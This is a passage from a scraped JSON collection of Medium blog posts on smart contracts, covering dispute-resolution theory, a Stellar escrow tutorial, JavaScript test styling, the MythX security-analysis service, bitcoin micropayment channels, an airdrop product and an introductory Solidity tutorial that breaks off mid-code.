anonymous reputational reporting. In a DAO tokenholders can earn additional tokens by making proposals for the improvement of the DAOs. If a tokenholder\u2019s proposals was voted in by the DAO community but the tokenholder proponent whose proposal was voted in cannot perform in the implementation of such proposal, such proponent will rarely get a second chance at making and implementing a given optimization proposal. We see our system of anonymous rating for judges as a parallel to the tokenholder voting system for optimization proposals in a DAO. Judges who do not receive sufficient upvotes simply may not get additional chances to work as a judge in a given smart contracting dispute.To mitigate the inevitable centralization that comes with expert involvement in a decentralized dispute resolution platform and ecosystem we provide several solutions. Because our proposed system is based on upvotes from users who have an interest in the subject, abuse of authority that happens naturally in the non-anonymous world (on mathoverflow among others) would be rather limited if not non-existent. And, crucially important for the success of the system in a legal realm, any abuse of authority would quickly be dis-incentivized by the deluge of downvotes such infamy would bring. Our solution allows anonymous contributors to gain reputation in certain areas of disputes based on whether their opinions are well-received. Such systems already exist in non-dispute resolution contexts. Reputation may also accrue and promote decision makers in dispute resolution by means other than erudition, such as network recognition, connectivity, among others.Optimized RepresentationThe open source platform ecosystem of dispute resolution in a distributed jurisdiction also facilitates optimized representation of a given party who in the Aragon system would only informally be able to use lawyers and perhaps would use lawyers from the existing jurisdictional infrastructure. The ecosystem allows for a more diverse allocation mechanism for smart contracts disputes to the most appropriate decision-making body/forum. But also, a platform ecosystem of dispute resolution fora would allow the integration of user representation in a given dispute.The Aragon network does not facilitate a representation system for dispute resolution. In the Aragon network, a user who wishes to dispute the execution of a contract in the Aragon Network posts a bond and prepares a brief on their argument. Such briefs are not necessarily written by a representative of the user. However, as the stakes get higher in the crypto economy and smart contracting, users may want to seek smart contract representation on their behalf to optimize their chances of success in front of decision makers in their respective disputes. Such representation in the platform ecosystem of decentralized jurisdictions would be enabled. The ecosystem would allow for a matching of representation and dispute resolution fora.ConclusionDistributed jurisdictional means for blockchain technology enabled smart contracting provides much needed governance from within the blockchain technology itself. Intra-blockchain distributed jurisdictional means such as via distributed jurisdiction are needed because the existing jurisdictional infrastructure produces suboptimal results for smart contract disputes. Distributed jurisdictional means effectively address the problems inherent in blockchain-based smart contracts. Our proposal in this paper for a distributed jurisdiction over blockchains ensures the maintenance of anonymity of blockchain-based smart contracting as the technology evolves.Building on the concept of distributed jurisdiction, we propose an open source platform ecosystem for smart contract disputes. Our proposal ensures full anonymity in blockchain transactions by instituting a requirement of anonymity for transaction parties to opt into the platform. The platform also ensures users can identify the highest possible expertise of their judges and arbiters. Our proposed system maintains the importance of good education and reputation on the principles of an evolving crypto law. Yet, through its anonymization it also eliminates the corrupting collection of power that specialized knowledge and relationships give to analog lawyers.Implementation of the proposed platform ecosystem for smart contract disputes would significantly boost consumer confidence in crypto transaction through the non-arbitrary, low to no-transaction cost, inducing effective and fair resolution of possible crypto disputes.For participants in the crypto economy who wish to minimize the transaction costs of dual integration and retain anonymity, our proposed open source platform ecosystem is more likely than all other available solutions to provide legal equivalence of dispute resolution mechanisms. For legacy businesses that desire to participate in the growth of crypto business opportunities, hope to avoid legacy system intermediation and the associated transaction costs, but require legal legacy system assurances and crypto dispute resolution equivalence, our proposed system offers a preferable and indispensable solution. By attracting legacy businesses and instilling confidence in the legal equivalency of dispute resolution in crypto transactions, our proposed solution makes an indispensable contribution to the evolution and significant growth of the crypto economy.", "responses": "2"}, {"title": "Stellar Escrow Smart Contract Development", "author_name": "Michiel Mulders", "link": "https://medium.com/wearetheledger/stellar-escrow-smart-contract-development-4c43ef32ac4b?source=search_post", "post_date": "Apr 12, 2018", "readtime": "4 min read", "upvotes": "263", "content": "Stellar Escrow Smart Contract DevelopmentCreate your first escrow smart contract on the Stellar\u00a0network.Michiel MuldersBlockedUnblockFollowFollowingApr 12, 2018Source: gratisography.comBefore reading this tutorial, you should have a basic understanding of how Stellar works and how to create a simple account on the test network. Take a look at my previous article in this series to get you updated.This article will explain to you how to develop an escrow smart contract using Stellar Lumens. I will as well highlight some extra features like retrieving a balance and a clean history log.Extra note: This article is part of the Blockchaingers series. Together with TheLedger, we have won the \u2018Digital Nations Infrastructure\u2019 track at the largest blockchain hackathon. You can find out more about our idea here. Escrow smart contracts on the Stellar testnet are part of this prototype.Use Case DescriptionWe have two identities: a house and a contractor. The house can pay a contractor for delivering house related services like a check-up of your central heating. Once the house and contractor agree to deliver a service, the house will deposit the agreed amount (in XLM) into the escrow contract. Once the job is done, both the house and contractor have to sign to release the funds.PreparationFirst, we need a new, empty account on the testnet. Let\u2019s create one.const newKey = Stellar.Keypair.random();const transaction = new Stellar.TransactionBuilder(ownerAccount)    .addOperation(Stellar.Operation.createAccount({        destination: escrowPubKey,        startingBalance: '2.5000000'    }))    .build();transaction.sign(ownerKeypair);return StellarConfig.server.submitTransaction(transaction);We still define an owner account who is creating the escrow but is not able to perform any actions with it. We use a config file for retrieving our server, this piece of code is the same as: new Stellar.Server('https://horizon-testnet.stellar.org');.Probably, you wonder why I\u2019m sending 2.5 XLM to the escrow? Each account needs a starting balance of 1 XLM. In addition, we are adding two more signers besides the random escrow signer. For each additional signer, you have to add 0.5 XLM. So,\u00a0\u20263 x 0.5 + 1 = 2.5This is defined in the Stellar documentation.Building Stellar Escrow TransactionLet\u2019s retrieve the escrow account,const escrowAccount = StellarConfig.server.loadAccount(pubKey);and build the escrow transaction.let transaction = new Stellar.TransactionBuilder(escrowAccount)    .addOperation(Stellar.Operation.setOptions({        signer: {             ed25519PublicKey: houseKeypair.publicKey(),            weight: 1        }    }))    .addOperation(Stellar.Operation.setOptions({        masterWeight: 0,        lowThreshold: 2,        medThreshold: 2,        highThreshold: 2,        signer: {            ed25519PublicKey: contractorKeypair.publicKey(),            weight: 1        }    }))    .build();As you can see, we add two signers to the escrow contract. We give both signers equal voting power (1) and set the threshold to two. Because we are not giving the escrow account itself an explicit weight, this is set to zero. This means both the house and contractor have to sign to release the funds. You can see an example of an escrow smart contract transaction creation here.Stellar Escrow\u00a0ContractAt last, we need to sign (with the random keypair) and send the transaction to the network.transaction.sign(newKey);await StellarConfig.server.submitTransaction(transaction);Ideally, the house sends the agreed amount to the smart contract. The code for sending the transaction looks like this.memo = Stellar.Memo.text('Pay: House to Contractor');return new Stellar.TransactionBuilder(<source-account>, { memo })    .addOperation(Stellar.Operation.payment({        <destination-pub-key>,        asset: Stellar.Asset.native(),        <amount>})).build();Release FundsReleasing the funds is actually very simple. You create a new transfer transaction from the escrow account to the contractor. The only difference here is that both the house and contractor have to sign.transaction.sign(houseKeyPair);transaction.sign(contractorKeyPair);Additional OperationsRetrieve History For\u00a0AccountThis will give you a nice list of all payments a certain account has executed. We remove the first result (with shift())from the array as that\u2019s the account creation (0 payment to itself).async retrievePayments(pubKey:string) {    let account = await this.loadAccountAsync(pubKey);    let payments = await axios.get(`${StellarConfig.baseUrl}/accounts/${account.accountId()}/payments`);    let paymentRecords = payments.data._embedded.records;    paymentRecords.shift();    return paymentRecords.map(record => {         return {             id: record.transaction_hash,             from: record.from,            to: record.to,            amount: record.amount        };    });}You can use the HTTP API endpoint /accounts/<account-ID>/payments to retrieve this in your web browser as well. You\u2019ll get something like:One payment object for an\u00a0account.Get Account\u00a0BalanceTo retrieve the XLM balance of an account, you just have to load the account based on its public key. As an account can have multiple balances (native XLM and other coins deployed on the Stellar network), we will only look for the native balance.async getBalance(pubKey) {    const account = await StellarConfig.server.loadAccount(pubKey);    let balance;    account.balances.forEach((balanceObject) => {        if (balanceObject.asset_type === 'native') {             balance = balanceObject.balance;        }    });    return balance;}Source: https://www.in3dc.comWhat to read\u00a0nextExploring Stellar Lumens | Introduction Development TutorialBlockchaingers hackathon 2018 | AftermathOur solution for the Blockchaingers hackathon\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a\u2014\u200a-NEXT ARTICLE IN THIS SERIES\u2192 The tech-stack to win the worlds biggest blockchain hackathon of 2018!", "responses": "3"}, {"title": "Beautifying Your Smart Contract Tests With JavaScript", "author_name": "Gustavo (Gus) Guimaraes", "link": "https://medium.com/@gus_tavo_guim/beautifying-your-smart-contract-tests-with-javascript-4d284efcb2e8?source=search_post", "post_date": "Nov 27, 2017", "readtime": "2 min read", "upvotes": "102", "content": "Beautifying Your Smart Contract Tests With JavaScriptGustavo (Gus) GuimaraesBlockedUnblockFollowFollowingNov 27, 2017Make your tests more readablePhoto by Kelly\u00a0SikkemaIn my previous blog post I wrote about testing smart contracts with JavaScript. In this one, I would like to show techniques I picked along the way that makes tests more readable and elegant.For this, I am going to use the code created in Testing Your Smart Contract With JavaScript as reference. Please read that blog post first.Carrying On Where We Left OffTo beautify out test code, let\u2019s use some handy libraries. Please go ahead and install these:npm install --only=dev --save chainpm install --only=dev --save chai-as-promisednpm install --only=dev --save chai-bignumberWe are adding these chai libraries to extend chai with elegant code syntax in our tests.Go to the/test folder and create a helpers.js file. Add the following code to this file:const BigNumber = web3.BigNumberconst should = require('chai')    .use(require('chai-as-promised'))    .use(require('chai-bignumber')(BigNumber))    .should()const EVMThrow = 'invalid opcode'module.exports = { should, EVMThrow }That\u2019s it.Applying in our testsLet\u2019s modify our first test with the new syntax so we have an idea. Here is the modification on the first test.fundRaise.jsconst FundRaise = artifacts.require('./FundRaise.sol')const { should } = require('./helpers')contract('FundRaise', function ([owner, donor]) {...    it('has an owner', async function () {        const fundRaiseOwner = await fundRaise.owner()        fundRaiseOwner.should.be.equal(owner)    })...First we require should from the helpers.js file as such:const { should } = require('./helpers')Then we change the first test by removing the assert syntax to the more readable should one.it('has an owner', async function () {        const fundRaiseOwner = await fundRaise.owner()        fundRaiseOwner.should.be.equal(owner)})Here we see that the pattern becomes variable +\u00a0.should +\u00a0.be+ equal + (expectation). You are able to find the whole range of api that should provides here.This is what it looks like when applying this syntax to the rest of the tests withinfundRaise.js\u00a0.I am curious to see what kind of elegant solution you have/ come up with testing your smart contracts with JS.The code for this blog post is found here https://github.com/gustavoguimaraes/smart-contract-testing-javascript-example-/tree/feature/beautifying-tests", "responses": "1"}, {"title": "The Tech Behind MythX Smart Contract Security\u00a0Analysis", "author_name": "Bernhard Mueller", "link": "https://medium.com/consensys-diligence/the-tech-behind-mythx-smart-contract-security-analysis-32c849aedaef?source=search_post", "post_date": "Mar 13", "readtime": "6 min read", "upvotes": "437", "content": "The Tech Behind MythX Smart Contract Security\u00a0AnalysisBernhard MuellerBlockedUnblockFollowFollowingMar 13When I first introduced Mythril in 2017, I didn\u2019t expect it to be very useful to smart contract developers. It was a simple symbolic analyzer for Ethereum bytecode with tacked-on Solidity support. Mythril was OK for detecting some security issues and solving CTFs, but it wasn\u2019t written with the needs of developers in mind.As soon as you want to use Mythril, or any other open source smart contract security tool for that matter, on an actual real-world project, things fall apart very quickly. Mythril takes ages to install and has 30+ command line flags. Running it consumes a lot of computing power. It reports only a limited subset of what\u2019s in the SWC Registry. It doesn\u2019t integrate well with development tools. And most frustratingly, when dealing with large projects, something always breaks. TL;DR: Mythril sucks for developers.Yet, there seemed to be demand for a tool like Mythril and people actually started using it, building it into their own software, and posting hundreds of issues on Github. As of today, Mythril has been downloaded 350,000 times.It was always clear to me that whatever we did, Mythril-the-Python-tool could never reach the usability and reliability required to be truly helpful to smart contract developers in their day-to-day job. Then, in early 2018, the \u201cINFURA of smart contract security idea\u201d came up: What if you could simply submit your contracts to an API and get back a a security analysis report? Voil\u00e0, MythX was born (well actually, Mythril Platform was born, but that had to be renamed due to legal threats from the Tolkien troll army).The MythX project started in early 2018 with funding from ConsenSys and two developers. Since then, the MythX team has grown to 15 heads and we have built (and acquired) a lot of awesome tech to pack into our security analysis engine. We also built an API that\u2019s scalable and won\u2019t break down even when people throw gigantic Truffle projects at it (I\u2019m looking at you Aragon).Our mission statement was to provide comprehensive smart contract security analysis in less than 2 minutes.Basically, MythX was supposed to be the iOS to Mythril\u2019s Android. It sounded easy enough at the time. But as it turned out, creating something that works under lab conditions was a completely different ballgame than creating a production-grade API that that always works\u2122. That said, I\u2019m happy to announce that we have achieved the goal (well, technically we\u2019re still in beta and things still break sometimes, but those kinks will be ironed out soon). If you have a Solidity file at hand you can try it right now:$ npm install -g @cleanunicorn/mythos$ mythos analyze <filename> <contract_name>MythX Security\u00a0AnalysisWhen you submit an analysis job to MythX, a lot of things happen. First, your MythX client submits all compiler artifacts, including bytecode, source maps, and the source code itself to the analysis service. The MythX service then forwards those inputs to several micro-services that run in parallel for a predefined execution time. It then evaluates the results and composes a response describing the security issues detected as well as their precise locations in the code. The tools assembly bears resemblance to a well-coordinated superhero team such as the Avengers. Let\u2019s have look at the main heroes.Static code analysis\u200a\u2014\u200aMaruOur static analysis tool, Maru, takes the Solidity AST as input and performs static security checks. This type of analysis is very fast, but the results are less comprehensive and reliable than the results of more costly analysis types.The logo of Maru, our static analyzer. We will open-source the Maru at some point\u200a\u2014\u200abut this time under GPL so not everybody can build it into their closed-source commercial tools.The MythX research team is currently working on a transpiler that converts Solidity code into an SSA intermediate representation and drastically improves Maru\u2019s detection capabilities. We\u2019re doing this to enable a \u201clightning\u201d \u26a1 mode that is useful for linters and IDE plugins that need to provide real-time feedback. Lightning mode will be ready to go by mid-2019. It is being built by Gerhard Wagner, Pavel Zverev and Dimitar Bounov and will likely be open-sourced later this year.Greybox Fuzzing\u200a\u2014\u200aHarveyFuzzing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program.Harvey is a greybox-fuzzer that uses light-weight program instrumentation to record the execution path for each tested input and compute its path identifier. The approach was developed by Valentin W\u00fcstholz and Maria Christakis and published in an 2018 paper (Valentin joined the MythX team mid-2018).Harvey is capable of rapidly reaching high code coverage even for complex code without using more expensive techniques, such as automated solvers, to reason about the program. Valentin has written extensively about Harvey, so if you\u2019re interested in the nitty-gritty details check out the references below.Legend has it that Harvey was named after Harvey Specter from\u00a0\u201cSuits\u201d.Further reading for Harvey:Learning Inputs in Greybox Fuzzing (Arxiv)Finding Vulnerabilities in Smart ContractsFuzzing Smart Contracts Using Input PredictionSymbolic Execution and SMT Solving\u200a\u2014\u200aMythrilMythril uses symbolic execution to detect vulnerabilities. With this approach, program inputs are assumed to be symbols that represent arbitrary input values. An EVM interpreter written in Python keeps track of the program states it encounters and collects constraints on inputs from predicates encountered in branch instructions. Every execution path discovered can be expressed as propositional formula. The resulting representation of program states and control flow can be used to prove certain properties of the program, determine reachability of error states, and perform various types of security analysis.Symbolic execution diagram from Joran\u2019s article Introduction to Mythril Classic and Symbolic ExecutionThe Mythril of today is a wholly different beast than the Mythril I presented nearly a year ago. Its symbolic execution engine has been completely refactored. It now performs optimized multi-transactional analysis and improved taint analysis. Mythril\u2019s EVM implementation passes the Ethereum VM tests. Credit for this goes to MythX team members Joran Honig, Nikhil Parasaram and Nathan Peercy.Further reading for Mythril Classic:Introduction to Mythril Classic and Symbolic ExecutionPractical Smart Contract Security Analysis and Exploitation\u200a\u2014\u200aPart 1 (yeah I know, I never wrote part 2 \ud83d\ude44).Smashing Smart ContractsCorrelation and Inter-Tool CommunicationSo we have three tools running in parallel, job well done, let\u2019s pack up and go home right? Wrong, because the most interesting possibilities open up by letting the tools \u201ctalk\u201d to each other. For example, a static analysis run can pre-determine interesting paths and provide seed states to the fuzzer, or give the symbolic analyzer a prioritized list of interesting states (or exclude certain paths from symbolic analysis altogether). This way, the analysis becomes a lot more efficient, and we are able to return a comprehensive result within seconds to minutes.There\u2019s actually another player named Maestro who pulls the strings in the background. Maestro decides on what jobs should go to which tool and knows how to interpret the results (all our tools speak a common JSON language). It also helps to remove duplicates and false positives, and can assign a confidence rating by correlating the output of multiple tools.We\u2019re now putting a lot of work into Maestro to make it \u201cdirect\u201d our tools in a Mozart-like fashion and make the analysis more efficient.What We\u2019re Working on\u00a0NextIn our industry, resting on one\u2019s laurels is not a very good idea. We\u2019re therefore working on countless research projects, including:eWASM support. Because eWASM is coming soon (lol), we have built a symbolic execution engine for WASM and are keeping a close eye on eWASM development;Various performance improvements such as better search strategies and redundant state elimination in Mythril and static pre-analysis to reduce the search space for both Mythril and Harvey;Applying machine learning to improve analysis quality over time;Support for other EVM-based blockchains such as Quorum;Support for additional languages (we\u2019ll add additional ones whenever there\u2019s enough demand).Support for other blockchains beyond Ethereum and EVM/eWASM.TL;DRMythX packs dozens of person-years of Ethereum security research by top experts into an easy-to-use API. While it builds on the original Mythril Classic tech, it is vastly more powerful and just works\u2122.You can try it out now by running some early awesome MythX tools or using the Truffle Security plugin. We also invite everyone to build their own MythX tools and earn a share of the subscriptions fees paid by their users. The team is active on Discord 24/7 if you have any questions.", "responses": "1"}, {"title": "A User-to-User Smart Contract Micropayment", "author_name": "Ryan X. Charles", "link": "https://ryanxcharlestimes.com/a-user-to-user-smart-contract-micropayment-d9b2b0ef1b47?source=search_post", "post_date": "Aug 1, 2016", "readtime": "6 min read", "upvotes": "31", "content": "A User-to-User Smart Contract MicropaymentRyan X. CharlesBlockedUnblockFollowFollowingAug 1, 2016Four months ago we started spending all of our developer effort on bitcoin micropayments. We have since designed our own shallow version of a smart contract payment channel network similar to and inspired by the Lightning Network. Designing it was the first step, and the next step was to implement it. As of today we have successfully tested our first user-to-user smart contract micropayment in a simulated environment. In other words, our micropayments technology has reached proof-of-concept stage. For more technical information, please see the appendix.While our tests prove that the technology will work, there is still a good deal of work left to do. The next step for us is to finish edge cases in the implementation, particularly opening and closing channels automatically. Then we will run a \u201creal\u201d test on bitcoin testnet. After that we will integrate the micropayments technology into our app, and then we can launch a preview to an invite-only audience on testnet.Building micropayments technology is so time consuming it\u2019s worth reflecting on why we believe this is important. On Yours, users will pay for content that is inexpensive by the standards of traditional media\u200a\u2014\u200aon the order of one cent. Traditional payment systems, like PayPal, charge fees that are far higher than this, on the order of thirty cents. It would not be worth paying one cent for content if you had to pay a thirty cent fee. Even bitcoin\u2019s fees of roughly five cents are too high for this.However, smart contracts on top of bitcoin allow users to guarantee payments to each other with cryptography. These smart contracts do not need to be on the blockchain. However, since these smart contracts do not have the irreversible security guarantees of transactions on the blockchain, it is possible for users to violate the contracts. But when a user violates the contract, other users involved in the contract can broadcast transactions to the blockchain to end the contract at that point. If Carol has received ten cents from Alice, and then Alice begins violating contracts, Carol can broadcast her latest transaction to the blockchain, get her ten cents, and she never has to deal with Alice again. The blockchain is a dispute mediator with a five cent fee.There has long been an argument that small payments are too small to be worth the psychological cost of deciding whether to make the payment. But the converse should also be considered\u2014 receiving a tiny payment is disproportionately rewarding given its size. We believe that this more than makes up for the psychological cost of making a payment, since even curators on Yours can earn money. It\u2019s worth it to make a small payment on Yours, because the joy of profiting is worth more than the value involved. Yours gamifies internet content.We estimate that by September we will have implemented the protocol edge cases and be able to perform a micropayment on bitcoin testnet. That will be a good point for us to try to estimate a timeline to launch. The remaining difficulties will be integrating micropayments into the product in a way that doesn\u2019t bewilder a mainstream audience. That will be difficult and will not happen instantly, although we have already done a lot of theoretical work to prepare for that.Let\u2019s take this opportunity to consider a couple of questions people keep asking us:If Yours is totally decentralized, what do you do about\u00a0trolls?Yours is not totally decentralized. Although we once called this project a \u201cdecentralized reddit,\u201d we have narrowed our scope to finish the project sooner. The only thing decentralized about Yours are the payments. Yours does not hold anyone\u2019s money. Yours will moderate content like every other social media app. Our focus is on getting content creators paid, not on censorship resistance.What\u2019s the difference between Yours and\u00a0Steem?Yours uses bitcoin, not a new cryptocurrency. Bitcoin has the largest ecosystem and is therefore the most useful and valuable blockchain for our purposes. We believe creating a new cryptocurrency is a distraction from the primary goal\u200a\u2014\u200agetting content creators paid. When you make a payment on Yours, you are investing directly into a piece of content, and therefore the content creator, not an unrelated cryptocurrency. We believe our approach is much more direct about getting the right people paid the right amounts. See this article.Appendix: Technical DetailsThe Yours protocol is inspired by the Lightning Network, but is not equivalent to it. Our design has one technical limitation which is that because segregated witness has not launched yet, there is presently no way to build a non-malleable transaction. Therefore, our funding transactions are subject to transaction malleability. However, we believe this will only be a minor problem in the early days when we have a small audience. People who fund channels are not incentivized to malleate the funding transaction, and third parties on the network will find it difficult to do so. Once the funding transaction is confirmed, there are no more known vulnerabilities with our protocol design. Once segregated witness is live on bitcoin mainnet, we will adopt it for our funding transactions, and there will be no known vulnerability at all.We are using HTLC (Hash Time-Lock Contract) transactions, like the original design of the Lightning Network. The Lightning Network team has since adopted a different set of contracts, but we have decided launching sooner outweighs the gains of a perfect protocol. We will improve our protocol design over time, after launch, when we have reasons to do so. We hope to ultimately be compatible with whatever the standard is in the bitcoin world.An outdated protocol specification is available here. We will publish a whitepaper sometime after launch.Our protocol has four layers. The base layer is a messaging layer. This layer fundamentally distinguishes micropayments from bitcoin proper\u200a\u2014\u200ausers need to be in direct communication with one another to send and receive a payment. Users are identified with a BIP 32 extended public key which they use to sign and encrypt messages and generate bitcoin addresses. The messaging layer happens through a server and is not decentralized (but you don\u2019t have to trust our server\u200a\u2014\u200awe can\u2019t read your messages). This allows us to launch much sooner than building on top of a decentralized messaging layer.On top of the messaging layer is the channel layer. We have a custom protocol for establishing, updating, and closing a channel between two users. The thesis of the channel layer is that each user, say Alice and Bob, maintain two commitment transactions, one belonging to Alice and one belonging to Bob. If Alice or Bob wish to close the channel at any time, they simply broadcast the latest commitment transaction that they own. If they broadcast an earlier transaction, they risk losing their money\u200a\u2014\u200athis is a security feature that gives the channels an irreversible-like property. Users are incentivized to play by the rules, and can broadcast the latest transaction if one user stops playing by the rules.On top of the channel layer is the route layer. In order for Alice to make a payment to Carol, she either needs a channel directly to Carol, or she needs to find someone who has a channel to Carol. If Bob has a channel to both Alice and Carol, Bob can act as a Smart Contract Oracle for the payment to communicate the payment from Alice to Carol. On launch, Yours will have one Smart Contract Oracle shared by everyone. Although this is a topologically centralized design, it\u2019s important to recognize that the Yours Smart Contract Oracle never has access to anyone\u2019s money. The Oracle is the Yours version of a Lightning Network node and our network is analogous to a Lightning Network where everyone is connected to the same node.On top of the route layer is the application layer. This is the normal bitcoin wallet embedded in the Yours front-end that manages private keys. The bitcoin wallet can send micropayments using the route layer to any other Yours user.As of today, the thing we have actually tested is the following. We have simulated Alice establishing a payment channel to Bob, and Bob establishing a payment channel to Carol. That is, Alice <-> Bob <-> Carol. Alice then makes a payment to Carol. Alice, Bob and Carol exchange four channel-level messages each, and one route-level message each, and Carol ends up with the payment. The payment used a fake funding transaction that was not broadcast to any blockchain\u200a\u2014\u200ahence \u201csimulated\u201d. Performing the same simulation on a real blockchain will require broadcasting transactions and monitoring the blockchain, which we have not yet added to our micropayment codebase. We will do that after we finish implementing the protocol.This post first appeared on the Yours Engineering Blog.", "responses": "2"}, {"title": "Reward wisely. Airdrop Smart Contract.", "author_name": "Vladimir Tikhomirov", "link": "https://medium.com/@VladimirTikhomirov/reward-wisely-airdrop-smart-contract-59d38cbf118b?source=search_post", "post_date": "Jul 6, 2018", "readtime": "2 min read", "upvotes": "282", "content": "Reward wisely. Airdrop Smart Contract.Vladimir TikhomirovBlockedUnblockFollowFollowingJul 6, 2018Hello everyone!Smart Contracts make the world a lot easier. This isn\u2019t simply a claim, it is a fact, and we will prove it. Say hello to the Airdrop Smart Contract from MyWish.The Airdrop Smart Contract was inspired by a complex process of token distribution used during a Bounty Campaign. To date, however, there have been no effective solutions to reward Bounty Hunters (the term commonly used in reference to active participants of any Bounty Campaign). The rewarding process consumed a lot of time because one would have to send tokens to thousands of participants individually. To input a wallet addresses is not a simple process, it demands a lot of concentration in order to not make mistakes and deny your participants their reward.From now on, MyWish\u2019s Airdrop Smart Contract will give any Bounty Campaign the opportunity to automate the rewarding process. The main benefit can be stated in two words: saving time. For example, you are able to distribute tokens to 100 different addresses in less than five-minutes. Excellent!This Airdrop Contract could be also used for pre-ICO period as an introduction part. Then it\u2019s logical to implement that to distribute tokens to participants.Additionally, clients of the Airdrop Smart Contract will save up to 30% of their crypto-assessments. As you may well know, in order to execute a transaction you have to use gas. We combine dozens of transactions into one in order to help you make more profit.Please note that the MyWish Platform does not store your tokens. You can call your Airdrop Smart Contract at any time and withdraw your investments.We invite you to take a look at our test version of the Airdrop Smart Contract and see how practical and easy your life could be. https://contracts.mywish.io/create. Free of charge!We always welcome and are eager to receive your feedback.", "responses": "4"}, {"title": "Ethereum Smart Contract Using Solidity, Which You Wished To Create But Didn\u2019t knew How To\u00a0Start?", "author_name": "Pramod Chandrayan", "link": "https://codeburst.io/a-simple-smart-contract-using-solidity-which-you-wished-to-create-but-didnt-knew-how-to-start-c7a6b39af1e7?source=search_post", "post_date": "Dec 28, 2017", "readtime": "9 min read", "upvotes": "235", "content": "Ethereum Smart Contract Using Solidity, Which You Wished To Create But Didn\u2019t knew How To\u00a0Start?Pramod ChandrayanBlockedUnblockFollowFollowingDec 28, 2017sourceBlockchain is the technology working at the core & empowering all the popular cryptocurrencies like Bitcoins, Ripple, Ethereum, Litecoins etc. It has been catching the imaginations of the masses and given them the reason to dream big. Having said that it becomes even more important for developer community & all tech entrepreneurs that they act responsibly to make sure the dreams of millions are given a proper wing so that they can fly with more enthusiasm and with a sense of security.I have already covered the blockchain basics in my previous articles-1. Blockchain Technology Part 1\u00a0: What and Why\u00a0?2. Blockchain Technology Part 2\u00a0: Smart Contract Fundamentals3. Smart Contract: A Blockchain Innovation For Non-TechiesIt is recommended that you go through all those basic fundamentals, to have the required understanding before we write our first smart contract.Assumption\u00a0:You must have basic fundamental knowledge of cryptocurrencies like Bitcoin & Ethereum, Litecoin etc\u2026You should have some hands-on experience in ANY programming language or scripts (like C, Java, JavaScript, PHP, Python, Ruby, Shell etc.)We will create our first smart contract using a popular Solidity Framework\u00a0. So let me first navigate you through some basics of Solidity as a whole. We will cover this journey together in following stepsWhat Is Solidity?IDE\u2019s & Tools We Need To Get Started.Getting Hands Dirty With Coding Stuff.Infographics: To keep You Informed1. What Is Solidity?Solidity is a high level language which helps developers to implement smart contracts and extracts it\u2019s essence from C++, Python & JS. Solidity language has been designed to support EVM(Ethereum Virtual Machine). Solidity is statically typed and supports inheritance. It comes loaded with a rich set of libraries to help you code with ease.Solidity is a contract-oriented, high-level language for implementing smart contracts. It has been influenced by C++, Python and JavaScript and is designed to target the Ethereum Virtual Machine (EVM). It is statically typed, supports inheritance, libraries and complex user-defined types among other features.With solidity, it is possible to create contracts for voting, crowdfunding, blind auctions, multi-signature wallets and more\u2026source: pwc2. IDE\u2019s & Tools We Need To Get\u00a0Started.To get started with solidity you need IDE, Some of the popular IDE\u2019s which support solidity plugin giving you all the tools you need to write your codes are:IDE\u2019s-As per official solidity web portal\u00a0:- Here are few among many IDE\u2019s which supports smart contracts development-Remix- It runs on browser and comes preloaded with code compiler & solidity run time environmentIntelliJ IDEA plugin Solidity plugin for IntelliJ IDEA (and all other JetBrains IDEs)Visual Studio Extension Solidity plugin for Microsoft Visual Studio that includes the Solidity compiler.Package for SublimeText\u200a\u2014\u200aSolidity language syntax Solidity syntax highlighting for SublimeText editor.Ethereum Studio Specialized web IDE that also provides shell access to a complete Ethereum environment.Solidity Tools(source)Dapp- Build tool, package manager, and deployment assistant for Solidity.Solidity REPL- Try Solidity instantly with a command-line Solidity console.Solgraph- Visualize Solidity control flow and highlight potential security vulnerabilities.evmdis- EVM Disassembler that performs static analysis on the bytecode to provide a higher level of abstraction than raw EVM operations.Doxity- Documentation Generator for Solidity.Installing Solidity:Using npm /\u00a0Node.js:It can be done in most portable & hassle free way using Emscripten a platform independent JS library. Here is the repository of solc-js. Download it. you will have command line tool called solcjs which you can install using npm as given below-npm install -g solcSolidity Binary Packages:To get Binary packages of Solidity click: solidity/releases.Binary packages of Solidity available at solidity/releases.Personal Packages\u00a0Archive:You can slo download PPAs for Ubuntu. For the latest stable version do thissudo add-apt-repository ppa:ethereum/ethereumsudo apt-get updatesudo apt-get install solcFor Cutting edge developer version do this:sudo add-apt-repository ppa:ethereum/ethereumsudo add-apt-repository ppa:ethereum/ethereum-devsudo apt-get updatesudo apt-get install solcFor more detail about getting through with the Solidity installation please go through\u00a0:Installing Solidity\u200a\u2014\u200aSolidity 0.4.20 documentationOnce you are through configuring Solidity based on your pc/laptops Operating system, you will be all set to start writing your very first Ethereum smart contract.3. Getting Hands Dirty With Coding\u00a0Stuff.Your Maiden Smart Contract Code Snippet\u00a0: Are You\u00a0Excited?Here We Go\u00a0.\u00a0\u2026\u2026\u2026.& It\u2019s Ok if you are not able to grab some of what has been written we will understand as we go about it in detail.MyFirstContract://Code Snippet 1.0pragma solidity ^0.4.0;// here we define the version of soliditycontract MyFirstContract {uint mydata;function set(uint x) public {mydata = x;}function get() public constant returns (uint) {return myData;}}Lets decode the code snippet 1.0:pragma\u00a0: keyword instructs compiler how to treat the source code written. As you can see we have instructed the compiler about the version of Solidity. A contract structure has two major component-FunctionsState(Data)this datas are stored at specific address on Ethereum Blockchain.uint mydata;  it is a declaration of data state variable which has a dataype of unsigned integer(of 256 bits size)functions:-function set(uint x) public {mydata = x;}function get() public constant returns (uint) {return myData;}here the functions set and get helps you to modify or retrieve the value of the variable.Note! In order to access a state variable like mydata, you don\u2019t need the prefix this. as we get to see in many other programming language.A Crypto Coin Demo Example in Solidity-Now when you have equipped yourself with some Smart Contract basics, I hope you are excited enough to further decode this smart contract mystery.I feel\u00a0:Every new skills learned should be a adventure for a developer. It should be a fuel to keep you going and to keep you inspired.See i am writing this article out of sheer excitement & with a purpose to learn more and help more fellow developers & blockchain enthusiasts.How Ethereum\u00a0WorksMyFirstCoin:This code snippet has been inspired by solidity official web pageCode Snippet 2.0// sourced frompragma solidity 0.4.8;contract MyFirstCoin {/** @note Example for the Solidity Course* @dev Just for demo the 